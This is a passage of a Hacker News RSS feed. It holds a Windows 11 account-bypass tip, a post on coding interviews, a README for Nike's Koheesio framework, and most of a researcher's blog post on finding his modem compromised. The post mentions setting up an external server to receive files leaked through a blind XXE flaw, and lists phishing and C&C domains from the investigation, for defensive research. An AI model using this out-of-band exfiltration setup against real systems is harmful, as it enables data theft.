<p>Another method of bypassing the account lockdown still exists. You simply have to enter OOBE\BYPASSNRO in the command prompt during the Windows 11 setup process, which allows you to skip the connection to the Internet and thus also the link to a Microsoft account. </p>



<p>However, it’s questionable how long this option will remain available. It seems that Microsoft is aiming to make the use of Windows 11 dependent on a Microsoft account. In combination with the increased calls for Windows users to finally switch to Windows 11, this appears to be a controversial combination.</p>



<p><em>This article originally appeared on PC Welt and has been translated from German to English.</em></p>

</div><p>This article originally appeared on our sister publication <a href="https://www.pcwelt.de/" rel="noreferrer noopener" target="_blank">PC-WELT</a> and was translated and localized from German.</p><div data-ga="article-footer-author">
				<p>Laura ist begeisterte Gamerin sowie Film- und Serien-Fan. Nach ihrem Studium der Kommunikationswissenschaft verschlug es sie direkt in die ersten Redaktionen, um ihre Leidenschaft auszuleben. Seitdem schreibt sie über alles rund um PCs und Technik-Themen und ist seit Mai 2024 bei PC Welt als feste Redakteurin tätig.</p>
					<ul>
																															
						  
						    
					</ul>
				
			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A breakthrough towards the Riemann hypothesis (316 pts)]]></title>
            <link>https://mathstodon.xyz/@tao/112557248794707738</link>
            <guid>40571995</guid>
            <pubDate>Tue, 04 Jun 2024 08:25:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mathstodon.xyz/@tao/112557248794707738">https://mathstodon.xyz/@tao/112557248794707738</a>, See on <a href="https://news.ycombinator.com/item?id=40571995">Hacker News</a></p>
&lt;Unparsable&gt;]]></description>
        </item>
        <item>
            <title><![CDATA[I Am So Sick of Leetcode-Style Interviews (398 pts)]]></title>
            <link>https://nelson.cloud/i-am-so-sick-of-leetcode-style-interviews/</link>
            <guid>40571395</guid>
            <pubDate>Tue, 04 Jun 2024 06:47:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nelson.cloud/i-am-so-sick-of-leetcode-style-interviews/">https://nelson.cloud/i-am-so-sick-of-leetcode-style-interviews/</a>, See on <a href="https://news.ycombinator.com/item?id=40571395">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div><p>I quit my previous job at <a href="https://robinhood.com/?ref=nelson.cloud" target="_blank">Robinhood</a>
in late November of 2023 mainly for health reasons. I’ve been in various interviews since then. Things have fallen off for one reason or another but I just gotta say…I am getting so tired of <a href="https://leetcode.com/problemset/?ref=nelson.cloud" target="_blank">Leetcode</a>
-style interviews. Especially since I know for a fact they don’t reflect the actual responsibilities of a software engineering of a job.</p><p>It seems like most (if not all) companies do these kinds of interviews simply because that’s what all the big companies do, like Google, Facebook, Amazon, and so on.</p><p>I’ve had some very bright engineers tell me that I shouldn’t memorize things that I can easily google. But yet, these interviews quiz me on things that I can easily Google that I may not know off the top of my head. It’s absurd.</p><p>I don’t really have a solution to this problem, I just know it’s a problem.</p><p>And I’m sick of it.</p><p>If you need a Software Engineer with AWS, Kuberentes, and Ruby on Rails experience, and you don’t do silly quizzes, feel free to reach out!</p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Koheesio: Nike's Python-based framework to build advanced data-pipelines (180 pts)]]></title>
            <link>https://github.com/Nike-Inc/koheesio</link>
            <guid>40570892</guid>
            <pubDate>Tue, 04 Jun 2024 05:07:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/Nike-Inc/koheesio">https://github.com/Nike-Inc/koheesio</a>, See on <a href="https://news.ycombinator.com/item?id=40570892">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><h2 tabindex="-1" dir="auto">Koheesio</h2><a id="user-content-koheesio" aria-label="Permalink: Koheesio" href="#koheesio"></a></p>
<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/Nike-Inc/koheesio/main/docs/assets/logo_koheesio.svg"><img src="https://raw.githubusercontent.com/Nike-Inc/koheesio/main/docs/assets/logo_koheesio.svg" alt="Koheesio logo" width="500"></a>
</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>CI/CD</td>
<td><a href="https://github.com/Nike-Inc/koheesio/actions/workflows/test.yml"><img src="https://github.com/Nike-Inc/koheesio/actions/workflows/test.yml/badge.svg" alt="CI - Test"></a> <a href="https://github.com/Nike-Inc/koheesio/actions/workflows/release.yml"><img src="https://github.com/Nike-Inc/koheesio/actions/workflows/release.yml/badge.svg" alt="CD - Release Koheesio"></a></td>
</tr>
<tr>
<td>Package</td>
<td><a href="https://pypi.org/project/koheesio/" rel="nofollow"><img src="https://camo.githubusercontent.com/fea8b211ac85787d156ca1ec6e2019c06414f0a9391c377f35ffaee98bad9603/68747470733a2f2f696d672e736869656c64732e696f2f707970692f762f6b6f68656573696f2e7376673f6c6f676f3d70797069266c6162656c3d50795049266c6f676f436f6c6f723d676f6c64" alt="PyPI - Version" data-canonical-src="https://img.shields.io/pypi/v/koheesio.svg?logo=pypi&amp;label=PyPI&amp;logoColor=gold"></a> <a href="https://pypi.org/project/koheesio/" rel="nofollow"><img src="https://camo.githubusercontent.com/d54efd240909933c8ec591c4a97a4a84dd3e7d1222c0be553856963ebb67f4e0/68747470733a2f2f696d672e736869656c64732e696f2f707970692f707976657273696f6e732f6b6f68656573696f2e7376673f6c6f676f3d707974686f6e266c6162656c3d507974686f6e266c6f676f436f6c6f723d676f6c64" alt="PyPI - Python Version" data-canonical-src="https://img.shields.io/pypi/pyversions/koheesio.svg?logo=python&amp;label=Python&amp;logoColor=gold"></a> <a href="https://pypi.org/project/koheesio/" rel="nofollow"><img src="https://camo.githubusercontent.com/1b118ecbda4ba4cbac01779e8ce45cf5c06605077cf9bfaeb496e5f6c42f2562/68747470733a2f2f696d672e736869656c64732e696f2f707970692f646d2f6b6f68656573696f3f636f6c6f723d626c7565266c6162656c3d496e7374616c6c73266c6f676f3d70797069266c6f676f436f6c6f723d676f6c64" alt="PyPI - Downloads" data-canonical-src="https://img.shields.io/pypi/dm/koheesio?color=blue&amp;label=Installs&amp;logo=pypi&amp;logoColor=gold"></a></td>
</tr>
<tr>
<td>Meta</td>
<td><a href="https://github.com/pypa/hatch"><img src="https://camo.githubusercontent.com/913a9419bb59f99a8378258a38e935948c906e1565b3a8a41fb8e1219d7bb680/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f2546302539462541352539412d48617463682d3430353162352e737667" alt="Hatch project" data-canonical-src="https://img.shields.io/badge/%F0%9F%A5%9A-Hatch-4051b5.svg"></a> <a href="https://github.com/astral-sh/ruff"><img src="https://camo.githubusercontent.com/18c26428c337f9d641fa09b629a3a03b514e8ac84b57974a0ed7d1b38e14e060/68747470733a2f2f696d672e736869656c64732e696f2f656e64706f696e743f75726c3d68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f61737472616c2d73682f727566662f6d61696e2f6173736574732f62616467652f76322e6a736f6e" alt="linting - Ruff" data-canonical-src="https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json"></a> <a href="https://github.com/python/mypy"><img src="https://camo.githubusercontent.com/da30df6e7fd8b77624a714a0abf60e9265b8ed07f842a3ab7dc7cbbcef581288/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f74797065732d4d7970792d626c75652e737667" alt="types - Mypy" data-canonical-src="https://img.shields.io/badge/types-Mypy-blue.svg"></a> <a href="https://numpydoc.readthedocs.io/en/latest/format.html" rel="nofollow"><img src="https://camo.githubusercontent.com/3b43ff97d2d36f56fd411cc1a5e131ec615ca816ed92c482556e778480ea3543/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f646f63737472696e672d6e756d7079646f632d626c7565" alt="docstring - numpydoc" data-canonical-src="https://img.shields.io/badge/docstring-numpydoc-blue"></a> <a href="https://github.com/psf/black"><img src="https://camo.githubusercontent.com/7d770c433d6198d89f8c1e2f187b904a9721d176259d0e97157337741cc8e837/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f636f64652532307374796c652d626c61636b2d3030303030302e737667" alt="code style - black" data-canonical-src="https://img.shields.io/badge/code%20style-black-000000.svg"></a> <a href="https://github.com/Nike-Inc/koheesio/blob/main/LICENSE.txt"><img src="https://camo.githubusercontent.com/3b6292ba7b832b6b3fda8c18eaca3c4351d1251ddaf70167664a2256b5d104f1/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c6963656e73652f4e696b652d496e632f6b6f68656573696f" alt="License - Apache 2.0" data-canonical-src="https://img.shields.io/github/license/Nike-Inc/koheesio"></a></td>
</tr>
</tbody>
</table>
<p dir="auto">Koheesio, named after the Finnish word for cohesion, is a robust Python framework for building efficient data pipelines.
It promotes modularity and collaboration, enabling the creation of complex pipelines from simple, reusable components.</p>
<p dir="auto">The framework is versatile, aiming to support multiple implementations and working seamlessly with various data
processing libraries or frameworks. This ensures that Koheesio can handle any data processing task, regardless of the
underlying technology or data scale.</p>
<p dir="auto">Koheesio uses <a href="https://github.com/Nike-Inc/koheesio/blob/main/docs/includes/glossary.md#pydantic">Pydantic</a> for strong typing, data validation, and settings management, ensuring a high level of type
safety and structured configurations within pipeline components.</p>
<p dir="auto">Koheesio's goal is to ensure predictable pipeline execution through a solid foundation of well-tested code and a rich
set of features, making it an excellent choice for developers and organizations seeking to build robust and adaptable
Data Pipelines.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">What sets Koheesio apart from other libraries?"</h2><a id="user-content-what-sets-koheesio-apart-from-other-libraries" aria-label="Permalink: What sets Koheesio apart from other libraries?&quot;" href="#what-sets-koheesio-apart-from-other-libraries"></a></p>
<p dir="auto">Koheesio encapsulates years of data engineering expertise, fostering a collaborative and innovative community. While
similar libraries exist, Koheesio's focus on data pipelines, integration with PySpark, and specific design for tasks
like data transformation, ETL jobs, data validation, and large-scale data processing sets it apart.</p>
<p dir="auto">Koheesio aims to provide a rich set of features including readers, writers, and transformations for any type of Data
processing. Koheesio is not in competition with other libraries. Its aim is to offer wide-ranging support and focus
on utility in a multitude of scenarios. Our preference is for integration, not competition...</p>
<p dir="auto">We invite contributions from all, promoting collaboration and innovation in the data engineering community.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Koheesio Core Components</h2><a id="user-content-koheesio-core-components" aria-label="Permalink: Koheesio Core Components" href="#koheesio-core-components"></a></p>
<p dir="auto">Here are the key components included in Koheesio:</p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Step</strong>: This is the fundamental unit of work in Koheesio. It represents a single operation in a data pipeline,
taking in inputs and producing outputs.</p>
<div data-snippet-clipboard-copy-content="┌─────────┐        ┌──────────────────┐        ┌──────────┐
│ Input 1 │───────▶│                  ├───────▶│ Output 1 │
└─────────┘        │                  │        └────√─────┘
                   │                  │
┌─────────┐        │                  │        ┌──────────┐
│ Input 2 │───────▶│       Step       │───────▶│ Output 2 │
└─────────┘        │                  │        └──────────┘
                   │                  │
┌─────────┐        │                  │        ┌──────────┐
│ Input 3 │───────▶│                  ├───────▶│ Output 3 │
└─────────┘        └──────────────────┘        └──────────┘"><pre lang="text"><code>┌─────────┐        ┌──────────────────┐        ┌──────────┐
│ Input 1 │───────▶│                  ├───────▶│ Output 1 │
└─────────┘        │                  │        └────√─────┘
                   │                  │
┌─────────┐        │                  │        ┌──────────┐
│ Input 2 │───────▶│       Step       │───────▶│ Output 2 │
└─────────┘        │                  │        └──────────┘
                   │                  │
┌─────────┐        │                  │        ┌──────────┐
│ Input 3 │───────▶│                  ├───────▶│ Output 3 │
└─────────┘        └──────────────────┘        └──────────┘
</code></pre></div>
</li>
<li>
<p dir="auto"><strong>Context</strong>: This is a configuration class used to set up the environment for a Task. It can be used to share
variables across tasks and adapt the behavior of a Task based on its environment.</p>
</li>
<li>
<p dir="auto"><strong>Logger</strong>: This is a class for logging messages at different levels.</p>
</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Installation</h2><a id="user-content-installation" aria-label="Permalink: Installation" href="#installation"></a></p>
<p dir="auto">You can install Koheesio using either pip or poetry.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Using Pip</h3><a id="user-content-using-pip" aria-label="Permalink: Using Pip" href="#using-pip"></a></p>
<p dir="auto">To install Koheesio using pip, run the following command in your terminal:</p>

<p dir="auto"><h3 tabindex="-1" dir="auto">Using Hatch</h3><a id="user-content-using-hatch" aria-label="Permalink: Using Hatch" href="#using-hatch"></a></p>
<p dir="auto">If you're using Hatch for package management, you can add Koheesio to your project by simply adding koheesio to your
<code>pyproject.toml</code>.</p>
<div dir="auto" data-snippet-clipboard-copy-content="[dependencies]
koheesio = &quot;<version>&quot;"><pre>[<span>dependencies</span>]
<span>koheesio</span> = <span><span>"</span>&lt;version&gt;<span>"</span></span></pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Using Poetry</h3><a id="user-content-using-poetry" aria-label="Permalink: Using Poetry" href="#using-poetry"></a></p>
<p dir="auto">If you're using poetry for package management, you can add Koheesio to your project with the following command:</p>

<p dir="auto">or add the following line to your <code>pyproject.toml</code> (under <code>[tool.poetry.dependencies]</code>), making sure to replace <code>...</code> with the version you want to have installed:</p>
<div dir="auto" data-snippet-clipboard-copy-content="koheesio = {version = &quot;...&quot;}"><pre><span>koheesio</span> = {<span>version</span> = <span><span>"</span>...<span>"</span></span>}</pre></div>
<p dir="auto"><h3 tabindex="-1" dir="auto">Features</h3><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<p dir="auto">Koheesio also provides some additional features that can be useful in certain scenarios. These include:</p>
<ul dir="auto">
<li><strong>Spark Expectations</strong>: Available through the <code>koheesio.steps.integration.spark.dq.spark_expectations</code> module;
<ul dir="auto">
<li>Installable through the <code>se</code> extra.</li>
<li>SE Provides Data Quality checks for Spark DataFrames. For more information, refer to the <a href="https://engineering.nike.com/spark-expectations" rel="nofollow">Spark Expectations docs</a>.</li>
</ul>
</li>
</ul>
<ul dir="auto">
<li>
<p dir="auto"><strong>Box</strong>: Available through the <code>koheesio.steps.integration.box</code> module</p>
<ul dir="auto">
<li>Installable through the <code>box</code> extra.</li>
<li>Box is a cloud content management and file sharing service for businesses.</li>
</ul>
</li>
<li>
<p dir="auto"><strong>SFTP</strong>: Available through the <code>koheesio.steps.integration.spark.sftp</code> module;</p>
<ul dir="auto">
<li>Installable through the <code>sftp</code> extra.</li>
<li>SFTP is a network protocol used for secure file transfer over a secure shell.</li>
</ul>
</li>
</ul>
<blockquote>
<p dir="auto"><strong>Note:</strong><br>
Some of the steps require extra dependencies. See the <a href="#features">Features</a> section for additional info.<br>
Extras can be done by adding <code>features=['name_of_the_extra']</code> to the toml entry mentioned above</p>
</blockquote>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">How to Contribute</h3><a id="user-content-how-to-contribute" aria-label="Permalink: How to Contribute" href="#how-to-contribute"></a></p>
<p dir="auto">We welcome contributions to our project! Here's a brief overview of our development process:</p>
<ul dir="auto">
<li>
<p dir="auto"><strong>Code Standards</strong>: We use <code>pylint</code>, <code>black</code>, and <code>mypy</code> to maintain code standards. Please ensure your code passes these checks by running <code>make check</code>. No errors or warnings should be reported by the linter before you submit a pull request.</p>
</li>
<li>
<p dir="auto"><strong>Testing</strong>: We use <code>pytest</code> for testing. Run the tests with <code>make test</code> and ensure all tests pass before submitting a pull request.</p>
</li>
<li>
<p dir="auto"><strong>Release Process</strong>: We aim for frequent releases. Typically when we have a new feature or bugfix, a developer with
admin rights will create a new release on GitHub and publish the new version to PyPI.</p>
</li>
</ul>
<p dir="auto">For more detailed information, please refer to our <a href="https://github.com/Nike-Inc/koheesio/blob/main/docs/contribute.md">contribution guidelines</a>. We also adhere to
<a href="https://github.com/Nike-Inc/nike-inc.github.io/blob/master/CONDUCT.md">Nike's Code of Conduct</a> and <a href="https://www.clahub.com/agreements/Nike-Inc/fastbreak" rel="nofollow">Nike's Individual Contributor License Agreement</a>.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Additional Resources</h3><a id="user-content-additional-resources" aria-label="Permalink: Additional Resources" href="#additional-resources"></a></p>
<ul dir="auto">
<li><a href="https://help.github.com/">General GitHub documentation</a></li>
<li><a href="https://help.github.com/send-pull-requests/">GitHub pull request documentation</a></li>
<li><a href="https://nike-inc.github.io/" rel="nofollow">Nike OSS</a></li>
</ul>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Hacking millions of modems and investigating who hacked my modem (824 pts)]]></title>
            <link>https://samcurry.net/hacking-millions-of-modems</link>
            <guid>40570781</guid>
            <pubDate>Tue, 04 Jun 2024 04:46:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://samcurry.net/hacking-millions-of-modems">https://samcurry.net/hacking-millions-of-modems</a>, See on <a href="https://news.ycombinator.com/item?id=40570781">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><h2 id="introduction">Introduction</h2>
<p>Two years ago, something very strange happened to me while working from my home network. I was exploiting a blind XXE vulnerability that required an external HTTP server to smuggle out files, so I spun up an AWS box and ran a simple Python webserver to receive the traffic from the vulnerable server:</p>
<pre><code>python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</code></pre>
<p>Once the webserver was running, I sent a cURL request from my home computer to make sure that it could receive external HTTP requests:</p>
<pre><code>curl "http://54.156.88.125:8000/test123"
</code></pre>
<p>Just a few seconds later, I saw the following log:</p>
<pre><code>98.161.24.100 - [16:32:12] "GET /test123 HTTP/1.1"
</code></pre>
<p>Perfect, this meant that I was able to receive network traffic on the box. Everything seemed good to go, but right as I switched back to exploiting the vulnerability, something very unexpected appeared in my log file:</p>
<pre><code>98.161.24.100 - [16:32:12] "GET /test123 HTTP/1.1"
159.65.76.209 - [16:32:22] "GET /test123 HTTP/1.1"
</code></pre>
<p>An unknown IP address had replayed the exact same HTTP request just 10 seconds later.</p>
<p>"Wow, that’s seriously weird," I thought. Somewhere, between my home network and the AWS box, someone had intercepted and replayed my HTTP traffic. This traffic should not be accessible. There is no intermediary between these two systems who should be seeing this. My immediate thought was that my computer had been hacked and that the hacker was actively monitoring my traffic.</p>
<p>To check if the same behavior occured on a different device, I pulled out my iPhone and typed in the URL into Safari. I sent the request, then peaked at my log file:</p>
<pre><code>98.161.24.100 - [16:34:04] "GET /uhhhh HTTP/1.1"
159.65.76.209 - [16:34:16] "GET /uhhhh HTTP/1.1"
</code></pre>
<p>The same unknown IP address had intercepted and replayed both HTTP requests from my computer and iPhone. Somehow, someone was intercepting and replaying the web traffic from likely every single device on my home network.</p>
<p>Panicked, I spun up a new AWS box running Nginx to make sure that the original instance hadn't been compromised somehow.</p>
<pre><code>sudo service nginx start
tail -f /var/log/nginx/access.log
</code></pre>
<p>I opened the URL once again from my iPhone and saw the exact same logs:</p>
<pre><code>98.161.24.100 - [16:44:04] "GET /whatisgoingon1234 HTTP/1.1"
159.65.76.209 - [16:44:12] "GET /whatisgoingon1234 HTTP/1.1"
</code></pre>
<p>Through what could only be my ISP, modem, or AWS being compromised, someone was intercepting and replaying my HTTP traffic immediately after I'd sent it. To eliminate the absurd idea that AWS had been compromised, I spun up a box on GCP instead and observed the same unknown IP address replaying my HTTP requests. It wasn’t AWS.</p>
<p>The only real option left was that my modem had been hacked, but who was the attacker? I queried the owner of the IP address and found that it belonged to DigitalOcean. Strange. That definitely didn't belong to my ISP.</p>
<h2 id="who-are-you-1596576209">Who are you, 159.65.76.209?</h2>
<p>To kick off an investigation, I sent the IP address to some friends who worked for threat intelligence companies. They sent me a link to the VirusTotal listing for the IP address which detailed all of the domains which resolved to the IP address over the past few years.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FrN9k23w.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Out of the last 5 domains that were tied to the IP address, 3 were phishing websites, and 2 were what appeared to be mail servers. The following domains all at one point in time resolved to the DigitalOcean IP address:</p>
<pre><code>regional.adidas.com.py (2019/11/26)
isglatam.online (2019/12/08)
isglatam.tk (2020/11/11)
mx12.limit742921.tokyo (2021/08/08)
mx12.jingoism44769.xyz (2022/04/12)
</code></pre>
<p>Two of the domains associated with the 159.65.76.209 IP address were <code>isglatam.online</code> and <code>isglatam.tk</code>. These were both at one point in time phishing websites for <code>isglatam.com</code>, a South American cybersecurity company.</p>
<p>After visiting the real ISG Latam website, we learned that they are based out of Paraguay and partnered with Crowdstrike, AppGate, Acunetix, DarkTrace, and ForcePoint. From a 10 minute read of everything, it appeared that the people who were intercepting my traffic had tried to phish ISG Latam using the same IP address.</p>
<h2 id="hackers-hacking-hackers">Hackers Hacking Hackers?</h2>
<p>Now this was odd. The IP address, just one year prior, was being used to host phishing infrastructure that targeted a South American cybersecurity company. Assuming that they have been in control of this IP address for 3 years, it would mean that they have used it for at least 2 different phishing campaigns and what appeared to be a C&amp;C server for router malware?</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FpUxs47C.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>Through URLscan, I learned that the <code>isglatam.online</code> and <code>isglatam.tk</code> websites were hosting generic BeEF phishing sites that can historically be seen <a href="https://urlscan.io/result/52459337-0f2d-4b26-859f-4a6f4eafa6dd#transactions">here</a>.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FWjapByA.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>The signature of the attacker was super interesting, because they were doing a lot of different malicious activities from the same box and apparently had not gotten suspended in over 3 years. It was really hard to piece together their intent with the Adidas, ISG Latam, and modem hacking thing all coming from the same IP address. There was a chance that the IP had rotated between different owners over the years, but it didn't seem likely as the gaps in between everything were long and it was unlikely that it was immediately reassigned to another malicious party.</p>
<p>Realizing that the infected device was still running, I walked over, unplugged it, and placed it into a cardboard box.</p>
<h2 id="handing-over-evidence">Handing Over Evidence</h2>
<p>The modem that I had been using was the Cox Panoramic Wifi gateway. After learning that it was likely compromised, I went to the local Cox store to show them my device and ask for a new one.</p>
<figure><img alt="" loading="lazy" width="100" height="100" decoding="async" data-nimg="1" sizes="100vw" srcset="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=640&amp;q=75 640w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=750&amp;q=75 750w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=828&amp;q=75 828w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=1080&amp;q=75 1080w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=1200&amp;q=75 1200w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=1920&amp;q=75 1920w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=2048&amp;q=75 2048w, https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=3840&amp;q=75 3840w" src="https://samcurry.net/_next/image?url=https%3A%2F%2Fi.imgur.com%2FcWsUSw3.png&amp;w=3840&amp;q=75"><figcaption></figcaption></figure>
<p>The one issue with this request was that in order for me to receive a new modem, I had to hand over the old one. Sadly, it wasn't actually my property — I was only <em>renting</em> it from the ISP. I explained to the employee how I wanted to keep and reverse engineer the device. Their eyes shot up a little bit. They were much less enthusiastic about giving it back to me.</p>
<p>“There’s no way I can keep it?” I asked. “No, we need to take your old one to give you a new one,” the ISP representative said. There was no budging. As much as I wanted to take it apart, dump the firmware, and see if there was any trace of whatever potentially compromised it, I had already passed the device off to the employee. I took my new device and left the store, disappointed that I wasn’t able to do anything more with it.</p>
<p>After setting up the new modem, the previous behavior completely stopped. My traffic was no longer being replayed. There was no "other IP" in the logs. Everything seemed fixed.</p>
<p>With a bit of dissapointment I concluded that the modem I no longer had access to was what had been compromised. Since I’d handed it over to the ISP and replaced the device, there wasn’t anything more that I could investigate besides maybe seeing if my computer had gotten hacked.</p>
<p>I gave up trying to figure it out. At least for the time being.</p>
<h2 id="three-years-later">Three Years Later</h2>
<p>In early 2024, almost three years later, I was on vacation with some friends who also worked in cybersecurity. We were having a conversation over dinner when I explained the story to them. Curious to learn more, they asked me for all of the details and thought it’d be fun to run their own investigation.</p>
<p>The first thing that caught their attention (having worked on more malware analysis a lot more than I had) was the format of the two mail server domains (<code>limit742921.tokyo</code> and <code>jingoism44769.xyz</code>). They pulled the IP address of the <code>mx1</code> subdomain for <code>limit742921.tokyo</code> and then ran a reverse IP search on all domains that had at one point in time pointed to that same IP address. There were over 1,000 domains that all followed the exact same pattern...</p>
<pre><code><span>{</span><span>"rrname"</span><span>:</span><span>"acquire543225.biz."</span><span>,</span><span>"rrtype"</span><span>:</span><span>"A"</span><span>,</span><span>"rdata"</span><span>:</span><span>"153.127.55.212"</span><span>}</span>
<span>{</span><span>"rrname"</span><span>:</span><span>"battery935904.biz."</span><span>,</span><span>"rrtype"</span><span>:</span><span>"A"</span><span>,</span><span>"rdata"</span><span>:</span><span>"153.127.55.212"</span><span>}</span>
<span>{</span><span>"rrname"</span><span>:</span><span>"grocery634272.biz."</span><span>,</span><span>"rrtype"</span><span>:</span><span>"A"</span><span>,</span><span>"rdata"</span><span>:</span><span>"153.127.55.212"</span><span>}</span>
<span>{</span><span>"rrname"</span><span>:</span><span>"seventy688181.biz."</span><span>,</span><span>"rrtype"</span><span>:</span><span>"A"</span><span>,</span><span>"rdata"</span><span>:</span><span>"153.127.55.212"</span><span>}</span>
</code></pre>
<p>Every single domain that was registered by the discovered IP address used the same naming convention:</p>
<pre><code>[word][6 numbers].[TLD]
</code></pre>
<p>Due to the mass-number of domains and algorithmic structure of the registered address, this appeared to be a domain generation algorithm used by malware operators to rotate the resolving address for the C&amp;C server for the purpose of obfuscation. There was a good chance that the IP address replaying my traffic was a C&amp;C server, and the two domains which I thought were mail servers were actually algorithmically generated pointers to the C&amp;C server.</p>
